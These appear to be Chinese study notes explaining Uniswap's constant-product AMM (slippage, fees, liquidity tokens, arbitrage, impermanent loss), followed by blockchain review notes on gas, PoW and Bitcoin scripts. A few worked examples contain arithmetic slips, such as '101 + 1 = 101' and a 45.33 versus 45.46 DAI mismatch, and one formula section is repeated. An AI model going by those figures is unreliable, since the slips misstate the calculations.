<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 10</span><br><span class="line">DAI 池 = 500</span><br><span class="line">恒定乘积值 = 500 * 10 = 5000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 10 + 1 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">Bob 将兑换得到 : 500–454.54 = 45.46 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.46 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.46 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>上面的计算过程，大家觉得有什么问题吗？可以继续计算例子来感受下【同样不考虑交易费】：</p>
<p>Bob想要再次发起交易来用自己的1个ETH兑换成ERC20代币DAI，当前的恒定乘积依然是5000：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">恒定乘积值 = 11 × 5000/11 = 5000</span><br></pre></td></tr></table></figure>

<p>重复之前的过程，这个ETH被添加到ETH池中，从而ETH池中有12个币，再次计算DAI池中应该保留的DAI币的数量。具体如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 11 + 1 = 12</span><br><span class="line">DAI 池 = 5000/12 = 416.66</span><br><span class="line">Bob 将兑换得到 : 454.54–416.66 = 37.88 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 37.88 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">37.88 DAI 出</span><br><span class="line">汇率 = 37.88 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>发现了什么问题呢？DAI币的价格上涨了。在刚创建流动资产时，可以认为一个ETH可以换50个DAI，1个DAI等于0.02个ETH，则经过第一次兑换之后，1个DAI则等于0.022个以太坊，相当于有10%的价格上涨。</p>
<p>如果第二次有人再购买1ETH，这时候Uniswap只返回了37.88个DAI，相当于1 DAI&#x3D;0.0264个ETH，又上涨了20%。</p>
<p>这里介绍一个新的概念，滑点。滑点是指用户最终实现兑换的汇率偏离了真实的汇率。譬如上面Bob第一次使用ETH购入DAI时，看到池中的比例，认为自己应该获得50个DAI，但实际上只获得了 45.46个。这个时候，相当于用户承受了损失。那么如何降低滑点呢？再看一个例子。</p>
<p>假设Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob发现此时以太坊上有两个Uniswap合约提供兑换功能。一个合约的资金池是10 ETH和500 DAI，另一个合约的资金池中流动性提供者一共存了100ETH和5000 DAI【也即此时的兑换币也是1:50】。那么Bob应该选取哪个合约进行兑换呢？上面我们已经讨论了恒定积为5000的例子，现在我们讨论下恒定积为500,000的例子。现在的基础的恒定乘积值为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 100</span><br><span class="line">DAI 池 = 5000</span><br><span class="line">恒定乘积值 = 5000 * 100 = 500，000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 101 + 1 = 101</span><br><span class="line">DAI 池 = 500，000/101 = 4950.50</span><br><span class="line">Bob 将兑换得到 : 5000–4950.50 = 49.50 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 49.50 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">49.50 DAI 出</span><br><span class="line">汇率 = 49.50 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>因此，从上面的例子中可以看出，当兑换金额相对于兑换池资金量过大，或者说对于一定的兑换金额，兑换池资金太少时，就会出现较大滑点。但当兑换池中的代币数量充足时，滑点的数额就会减少，而且资金越多，滑点越小。滑点的大小和常说的交易深度【<strong>交易深度</strong>是指市场在承受大额交易时币价不出现大幅波动的能力】大小相反，滑点越小，交易深度越大，用户越能够按照稳定的价格完成交易。</p>
<p>因此，为了吸引用户，Uniswap合约中需要有足够大的资金池，但是Uniswap无法自己变出钱来，因此需要依赖外部资金向合约中注入资金，以提供流动性，向Uniswap流动池中提供流动性的用户被称为流动性提供者。但是Uniswap如何吸引流动性提供者呢？</p>
<p>当流动性提供者向Uniswap中注入流动性的时候，Uniswap会铸造出一个流动性代币，铸出代币数量是与用户注入的资金所占流动池中的资金比例相关，流动性提供者可以选择在任何时间销毁自己持有的流动性代币。为了鼓励用于向Uniswap的流动池中提供更多的流动性，Uniswap会从每笔交易总额中抽取0.3%当成交易手续费，并将手续费全额交给那些将注资金到Uniswap资金池提供流动性的流动性提供者。</p>
<p>在上面的例子中，流动性提供者需要将等值的ETH以及ERC20代币充值到交易合约中。第一个向此合约中提供流动性的流动性提供者就拥有设置此ERC20代币与ETH之间兑换汇率的权利。第一个流动性提供者把自己认为等价值的ETH数量和ERC20代币数量充值到此交易合约，就可以实现设置汇率。而如果第一个流动性提供者设置的这个汇率和外面更大盘的市场不一致，那么套利交易者就会通过交易来把这些价差抹平，和大盘保持一致的汇率。此后所有流动性提供者将以其充值时的汇率作为计算等价的依据。</p>
<p>接下来再看一个例子，在有交易费用的情况下，如何影响用户的兑换率。</p>
<p>考虑资金池中有10个ETH和500个DAI的情况，Bob将通过向交易合约的ETH池发送1ETH来启动交易，此时，交易金额的0.3%也就是0.003ETH将被扣除作为给流动性提供者的报酬。剩余的0.997ETH则被添加到了ETH池里面。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">费用 = 0.003 ETH</span><br><span class="line">ETH 池 = 10 + (1–0.003) = 10.997</span><br><span class="line">DAI 池 = 5000/10.997 = 454.67</span><br><span class="line">Bob 将兑换得到 : 500–454.67 = 45.33 DAI</span><br></pre></td></tr></table></figure>

<p>在Bob开始交易时收取的流动性提供者费用，现在又重新添加到ETH流动池里面。这是对流动性提供者的一种报酬，当这些流动性提供者从流动池中取回自己的ETH和ERC20代币时，可以获得这些报酬【也即当LP退出的时候，才真正拿走】。由于这些流动性提供者的报酬是在上述兑换交易计算后才添加回ETH流动池里面，因此在交易合约上每执行一次交易，恒定乘积值就会增加一点，这就让流动性提供者为交易合约提供流动性这件事儿，成为一种有利可图的行为。这笔交易完成后，</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 = 10.997 + 0.003 = 11</span><br><span class="line">DAI 池 = 454.67</span><br><span class="line">新的恒定乘积值 = 5,001.37</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.33 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.33 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>可以看出，相比于没有手续费的情况，Bob的兑换率是降低了；同时，恒定乘积值变大了。多出来的部分实际上就是流动性提供者的报酬。如果此时流动性提供者退出，那么就会拿走报酬，同时因为资金池中相应比率的资金的减少，恒定乘积会降低。</p>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$ 是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了$(1+\alpha\gamma)(1-\beta)&#x3D;1$ </p>
<p>所以， $\alpha$和$\beta$  的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>k除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<hr>
<p>接下来，讨论下，流动性提供者提供资金时的比例和影响。因为恒定乘积公式的K越大，也就是资金池里的资金越多时，代币交换滑点越小，流动性也就越好。所以，AMM模式鼓励用户为兑换资金池提供流动性，方式就是用户向流动性资金池中存入等价值的2种代币，比如上面例子里，用户同时存入10个ETH 和500个DAI，得到20个ETH和1000个DAI，此时能够位置ETH和DAI的比例。如果用户存入的2种代币不等值，比如他存入了10个ETH和50个DAI，（此时的市价还是1个ETH换50个DAI）这会造成兑换池里ETH的供给相对过剩，ETH和DAI的相对价值就出现了不平衡，此时池中的供应量是20个ETH和550个DAI。相当于一个ETH只能换27.5个DAI。此时套利者就可以在外部购入DAI，然后在该合约中兑换ETH，从而进行获利。</p>
<p>可以来计算一下，此时资金池中共有</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ETH 池 = 20</span><br><span class="line">DAI 池 = 550</span><br><span class="line">新的恒定乘积值 = 20 * 550 = 11000 </span><br></pre></td></tr></table></figure>

<p>套利者此时可以使用DAI来兑换ETH。此时，套利者可以向合约中存入191.6个DAI，来兑换相应的ETH。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">套利者发送了 191.6 DAI</span><br><span class="line">DAI 池 = 550 + 191.6 =741.6</span><br><span class="line">ETH 池 = 11000 / 741.6 = 14.83</span><br><span class="line">Bob 将兑换得到 : 20–14.83 = 5.17 ETH</span><br><span class="line"></span><br><span class="line">套利者获利</span><br><span class="line">5.17 - 191.6/50 = 5.17 - 3.832 = 1.338 ETH </span><br><span class="line">资金池恢复平衡</span><br><span class="line">741.6 / 14.83 = 50</span><br></pre></td></tr></table></figure>

<p>套利者如何计算得出应该存入191.6个DAI呢？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（550 + x） * (20 - y) = 11000</span><br><span class="line"> (550 + x) / (20 - y) = 50</span><br></pre></td></tr></table></figure>

<p>上面讨论了Uniswap通过给流动性提供者的奖励，也即交易所的手续费，手续费率为0.3%，流动性提供者之间依据存入资金的份额按比例分配。加入一天的成交额是40.85亿CNY，那么一天的手续费就有122万元，经过一段时间的积累，流动性提供者（LP）得到的手续费奖励金额就非常可观了。Uniswap会根据流动性提供者存入资金的数额发给他们一定数量的LP token，我们可以理解为存款奖状或者收据，它是LP获得交易所手续费奖励的凭证。</p>
<p>举个例子具体说明：假设这个交易对是ETH–DAI，目前兑换比例是1ETH–50DAI。我向资金池充了1ETH和50DAI，这个资金池发给我1个LP token，代表我有1份（ETH–DAI）的流动性贡献。这个资金池所产生的手续费进入一个pool，经过一段时间后，pool中共有积累的手续费A个ETH和B个DAI，当我把我的1个LP token交还给Uniswap时，我有权利从pool拿走它按比例对应的手续费。假设此时整个资金池共发出了X个LP token，我的流动性贡献占比就是1&#x2F;X，我就可以获得A&#x2F;X个ETH和B&#x2F;X个DAI【手续费】，然后再赎回我的1ETH和50DAI。</p>
<p>Uniswap通过AMM模式和为流动性提供者奖励手续费的模式，极大地调动了LP的积极性。由于任何人都可以提供流动性并且从中获利，人们有动力为Uniswap提供流动性；交易所获得充足的交易流动性，交易滑点就小，用户体验也好。交易所的运行完全基于市场的需求进行。人工的运维成本大幅降低。</p>
<p>在Uniswap中，交易产品的挂牌会是免费的。而且由于不需要再用交易订单的模式，而且流动性也不需要专门的做市商来提供，因此目前证券市场中的做市商的成本就可以取消。降低了上币成本和做市成本，Uniswap对DeFi和整个区块链行业的发展起到了一定的促进作用。</p>
<p>但是，作为流动性提供者，虽然为Uniswap提供流动性可以交易手续费，但也存在无常损失。无偿损失是指流动性提供者按当时的市价存入2种代币，在他要取出这些代币时，它们的兑换价格发生了变化而导致的损失。如果这2种代币中某个代币大幅上涨或下跌都可能导致无常损失。注意，不管涨还是跌，都有可能导致损失。</p>
<p>还是以上面的DAI和ETH为例。当50个DAI换1个ETH时，我存入50个 DAI 和1个 ETH。假设现在行情变化，也就是DAI和ETH的兑换比例变化了：不管现在是50个DAI换2个ETH（ETH跌了），还是100个DAI换1个ETH（ETH涨了），流动性提供者如果想赎回资金，都必须按照现在的兑换比例，取出价格相等的DAI和ETH，不能破坏资金池中2种代币的比例平衡，不然套利者就又要出动了。这也就是说，流动性提供者取出来的不是存入的50 DAI和1个ETH，而是按照新的市价的兑换比例，而这相比我直接持有50 DAI和1个ETH不动，有可能会产生损失。</p>
<p>impermanent loss</p>
<p>向Uniswap中提供流动性的人会发现一个现象：“目前在流动池中资金的价值比放入流动池之前的资金价值少了，也就是资金缩水了”，这种现象被称为“impermanent loss”，impermanent loss，中文翻译成“无常损失”，简单来说impermanent loss是指你将加密货币放入uniswap中赚取的收益与你将加密货币放入钱包中的收益之间的差。</p>
<p>hold指不看币价涨跌长期持有某种加密货币（hold on for dear life）</p>
<p>impermanent loss通常是由于流动池中的价格发生波动引起的，下面看一个例子： </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233127.jpg" alt="img"></p>
<p>可以看出价格从100变成120后我们的资金只有之前的99.59%，损失了0.4%左右。只要这时候我们不将资金从流动池中取出，一旦流动池中的币价回到100时，我们是没有损失的，这是为什么叫impermanent loss无常损失的原因。</p>
<p>下图演示impermanent loss的比率与当前价格变化的关系，O列表示资金刚放入流动池的情况，O-&gt;H表示价格上涨时impermanent loss的变化，A&lt;-O表示价格下跌时impermanent loss的变化。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233128.jpg" alt="img"></p>
<p>下图是根据上面数据画出的函数图像，蓝色的曲线是不包含手续费的，黄色的图像包含手续费，红色的线条是为了方便说明。</p>
<p>先看蓝色曲线，当不计算手续费收益的情况下，无论币价上涨或下跌，流动性提供者100%会有损失。</p>
<p>再看黄色的曲线，由于黄色曲线是计算手续费收益的，所以只要币价在一个范围内波动，流动性提供者可以稳赚手续费收益。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233129.jpg" alt="img"></p>
<p>由此可以得出一个结论要介绍impermanent loss对流动性提供者的影响，可以为两个币价之间波动小的流动池提供流动性。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233130.jpg" alt="img"></p>
<p>· mean-reverting pairs：均值回归的交易对，比如稳定币交易对两者波动是最小的，可以最大程度减少impermanent loss · correlated pairs：有正相关性的交易对，例如ETH&#x2F;ZRX，这两个币的波动方向基本上是一致的，同涨同跌，两者之间的相对波动小 · Uncorrelated pairs：非相关性的交易对，如ETH&#x2F;D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a>，为这种交易对提供流动性，赚取的交易费有可能会覆盖impermanent loss · Inverse correlated pairs：负相关的交易对，是最危险的，他们之间波动方向相反，两者之间的相对波动范围最大。</p>
<p>下面是计算impermanent loss的公式 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233131.jpg" alt="img"></p>
<hr>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了</p>
<p>$(1+\alpha\gamma)*(1-\beta)&#x3D;1$</p>
<p>所以,$\alpha$和$\beta$的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<p>优点</p>
<p>完全去中心化，不依赖第三方，任何人都可以基于uniswap构建自己的应用<br>可以自由地创建任何ERC20交易对<br>与其他去中心化交易所相比gas费用更低<br>任何人都可以向uniswap流动池中提供流动性，人人都可以是做市商</p>
<p>缺点</p>
<p>需要依赖套利者去平衡uniswap与外部交易所之间的汇率<br>对大户不友好，进行大额的交易会造成很大的滑点 </p>
<hr>
<p>了解Uniswap的原理之后，再来看一下疯狂的币圈。</p>
<p>Uniswap的恒定乘积机制决定了，哪一边的买入数量多，价格就会上升，同时如果买入的越晚，上涨的幅度则越快。所以，一旦一个Uniswap的代币进入了大多数人的视野，不断上涨的币价让追涨杀跌的韭菜们争先恐后的买入，从而进一步推动价格上涨，直到没有人再买了，就开启同样的快速下跌过程。CoinGecko数据显示，从5月30日到6月5日，STA币价从几乎为空气价的0.00001元一路涨至约1元，上涨约10万倍。然后又快速下跌。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233132.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619www.chainnode.com</a><a href="https://link.zhihu.com/?target=https://www.qklw.com/top/20200710/100667.html">Uniswap上庄家的收割套路 - 区块链网www.qklw.com<img src="https://pic3.zhimg.com/v2-64e626cb3c3ecd6faa0c616a08cddc62_ipico.jpg" alt="图标"></a></p>
<p>参考：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/167023364">https://zhuanlan.zhihu.com/p/167023364</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/611741523815.htm">https://www.chainnews.com/articles/611741523815.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/79dbc73f8de4">https://www.jianshu.com/p/79dbc73f8de4</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hulianmaibo.com/posts/info/13110">https://www.hulianmaibo.com/posts/info/13110</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn">https://www.okex.com/academy/zh/taking-uniswap-curve-balancer-as-an-example-detailed-analysis-of-automatic-market-maker-amm-cn</a> 【感觉不对；而且uniswap交易所也会跑路】</li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df">https://medium.com/cortexlabs/defi%E7%A7%91%E6%99%AE%E7%B3%BB%E5%88%97%E4%B9%8B-%E4%B8%80-uniswap%E5%88%B0%E5%BA%95%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%BD%AC%E7%9A%84-2a82c9afc1df</a></li>
<li><a href="https://link.zhihu.com/?target=http://jizhid.com/number/blockchain/45304.html">http://jizhid.com/number/blockchain/45304.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cailu.net/article/13113111130466711.html">https://www.cailu.net/article/13113111130466711.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html">https://www.cnblogs.com/zdz8207/p/qkl-Uniswap.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnode.com/post/466619">https://www.chainnode.com/post/466619</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/media/621174">https://www.8btc.com/media/621174</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/01/12/create_token/">https://learnblockchain.cn/2018/01/12/create_token&#x2F;</a> 以太坊代币</li>
</ol>
<h1 id="区块链技术复习"><a href="#区块链技术复习" class="headerlink" title="区块链技术复习"></a>区块链技术复习</h1><h2 id="gas的目的"><a href="#gas的目的" class="headerlink" title="gas的目的"></a>gas的目的</h2><p>以太坊中实现的脚本语言是图灵完备的,gas的引入可以防止用户在脚本中写死循环来坑矿工.</p>
<p>gas的目的是限制执行交易所需的工作量，同时为执行支付费用。gas 用来衡量你的这笔交易（或者合约代码调用）所消耗的资源（包括计算量，存储，带宽等）。除了计算交易的费用外,交易或者合约上传也需要费用.一笔交易所产生的转账费用会奖励给打包包含这笔交易的区块的矿工。区块不是哪个矿工产生的，所有的矿工都会竞争下一个区块的打包权，胜出者可以打包下一个区块。交易不一定会存在一个区块，它交易被广播出去后，在数秒内全网所有的节点都会接收到这笔交易。矿工会优先打包 gas 合理，gas price 高的交易。如果用户交易时所支付的矿工费非常低(out of gas), 那么这笔交易可能不会被矿工打包, 从而造成交易失败。交易运行完毕,如果有剩余,再退还给用户,如果不够,矿工也不还钱,只是把交易全部回滚</p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p>为了克服拒绝服务和无限循环，使用0.00001以太币或1 Gas用于执行一行代码。如果没有足够的以太币，交易不会被执行。它也是为了促进代码设计者提高效率，而不是浪费带宽和CPU的利用率。</p>
<p>以太坊的交易费用&#x3D; gas 数量 * gas price (gas 单价, 以太币计价) </p>
<h4 id="为什么需要多个hash函数呢？"><a href="#为什么需要多个hash函数呢？" class="headerlink" title="为什么需要多个hash函数呢？"></a>为什么需要多个hash函数呢？</h4><p>降低误判率</p>
<p>如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。</p>
<p>区块链技术提供了一种交易记录和执行的新的形式，具有去中心化、不可篡改和抵赖等优秀的性质，在金融和公共事务方面有着巨大的潜力应用。目前为止，区块链最成功的应用仍然是比特币，因此，课程中，我们主要以比特币为例子来讲解区块链。主要介绍了区块链中最基本和最重要的概念：分布式记账、共识机制、区块（Merkle树）、脚本等。在延伸介绍区块链2.0以太坊时，涉及了以太坊的特点、以太坊上智能合约的编写，以及区块链安全，特别是智能合约的安全。最后，介绍了以太坊上去中心化代币兑换协议uniswap。【最后，提及区块链3.0，讨论了PoW、PoS和DPoS的特点和区别。2020年没讲】</p>
<p>首先，我们讨论了数字货币的概念，通过回顾人类史上货币的发展历程，讨论货币的特点，它可以不具有实体、本质特征是账本上记录的交易。为了让金融系统公开、公正、不可篡改，需要一个分布式的具有不可篡改的记账系统。</p>
<p>在这样的分布式记账系统的发展过程中，出现了很多优秀的思想，例如CyberPunk曾先后提出的ecash、hashcash和B-money，比特币也是在这些尝试的基础上发展而来。ecash提出了盲签的概念，“这是第一次有人认为数字本身是有价值的，这个想法是你可以通过盲签名方法来获得这些数字，且没人知道你得到的是哪个数字，但他们知道这些是有价值的数字，银行会兑现他们的款项。”HashCash中提出了工作量证明的方法，“使用部分哈希的想法是它们可以被任意地设置为昂贵的计算成本，但是可以对其立即进行验证”。B-money中提出了公共账簿和使用公钥作为身份标识的方法，交易通过网络向所有节点进行广播。</p>
<p>分布式的、不可篡改、而且防止双重支付的公共账本的思想需要有强有力的技术支撑。区块链中依赖于密码学的技术，哈希和非对称加密。</p>
<p>比特币区块链中使用的哈希算法是SHA-256，它有一些很好的特性，如确定性、快速计算、隐藏性、雪崩效应以及抗冲突。哈希在区块链中的应用是工作量证明，在区块链中的节点为了争取到记账的权利，需要进行大量的哈希运算，找到满足条件的随机数，才能形成链上的区块。</p>
<p>比特币区块链中使用的非对称加密的算法是椭圆曲线。当前应用较广的非对称加密算法是RSA。课上我们详细介绍了RSA中公私密钥对生成的方法，以及使用RSA进行身份认证以及加密传输的过程。</p>
<p>接下来我们讨论了比特币中的共识机制PoW。共识机制本质上就是要保证所有节点认可的账本是唯一的。做到这一点，在中心化的系统中很容易，但是在分布式系统中，必须要考虑到参与节点的故障可能以及潜在的恶意攻击者的情况。在区块链上，所有的交易向所有的节点广播，矿工收到的交易的内容和顺序都可能不同；而且出块有奖励的情况下，所有的节点都会尽量出块。那么由哪个节点产生区块以及如何防止恶意节点攻击（如拒绝服务、双重支付等）？PoW通过让参与节点进行算力的竞争，使得在大部分的节点是诚实节点的情况下，DoS攻击以及双重支付攻击不会成功（支付等待6次确认）；即使有节点真正掌握了51%的算力，考虑到控制算力的巨大投入，节点也会主动维持区块链的正常运行。</p>
<p>在产生区块之后，接下来就是要理解区块上记录的内容。区块上的内容主要是一笔笔的交易。由于缺少对全局数据（如余额）的支持，比特币并没有采用基于账户的方式来表示交易，而是以UTXO（Unspent Transaction Output），将之前交易的输出作为新交易的输入。我们详细地察看了交易的具体内容，并介绍了输出位置上的ScriptPubKey以及输入部分的ScriptSig。先前交易的输出需要设置相应的条件，之后的交易必须要满足这个条件才能使用这笔输出中包含的钱。所以如果矿工在接收到交易时，将新交易中的ScriptSig和先前交易中的ScriptPubKey结合起来，能顺利运行结束返回True，那么这个交易便是合法的，可以被打包进区块。同时，因为所有的验证必须由矿工完成，为了防止矿工陷入死循环，比特币能支持的脚本语言是图灵不完备的，仅能够完成有限的操作。举一个简单的例子，如果之前交易中ScriptPubKey中设置的条件是 3 op_add 5 op_equal，那么新交易中的ScriptKey应该是什么呢？</p>
